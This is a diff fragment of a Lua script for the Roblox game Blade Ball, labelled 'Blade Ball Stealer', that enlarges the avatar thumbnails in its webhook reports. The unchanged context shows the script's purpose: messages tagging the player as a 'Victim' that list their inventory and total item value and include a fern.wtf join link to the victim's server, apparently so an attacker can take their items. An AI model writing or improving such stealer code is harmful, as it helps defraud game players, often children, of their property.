@@ -95,7 +95,9 @@ local function SendJoinMessage(list, prefix)
                 {name = "🔗 Join link:", value = "[Click to Join Server](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", inline = false},
                 {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
             },
-            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"},
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
+            },
             ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
         }}
     }
@@ -115,7 +117,9 @@ local function SendOnServerMessage()
                 {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                 {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true}
             },
-            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"},
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
+            },
             ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
         }}
     }
